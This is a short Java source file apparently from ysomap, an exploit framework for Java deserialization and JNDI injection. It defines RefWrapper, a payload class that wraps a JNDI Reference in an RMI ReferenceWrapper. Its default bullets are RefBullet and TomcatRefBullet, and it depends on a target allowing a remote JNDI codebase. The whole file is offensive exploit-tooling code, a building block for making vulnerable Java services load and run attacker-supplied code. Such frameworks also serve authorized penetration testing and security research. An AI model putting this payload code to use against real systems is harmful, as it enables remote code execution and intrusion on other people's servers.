package ysomap.gadget.payload.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.gadget.ObjectGadget;
import ysomap.gadget.bullet.jdk.rmi.RefBullet;
import ysomap.gadget.payload.Payload;

import javax.naming.Reference;

/**
 * @author wh1t3P1g
 * @since 2020/2/27
 */
@Require(bullets = {"TomcatRefBullet","RefBullet"})
@SuppressWarnings({"rawtypes"})
@Dependencies({"allowed jndi remote codebase"})
@Authors({ Authors.WH1T3P1G })
public class RefWrapper extends Payload<ReferenceWrapper> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof Reference;
    }

    @Override
    public ObjectGadget getDefaultBullet(String command) throws Exception {
        return new RefBullet();
    }

    @Override
    public ReferenceWrapper pack(Object obj) throws Exception {
        return new ReferenceWrapper((Reference) obj);
    }
}
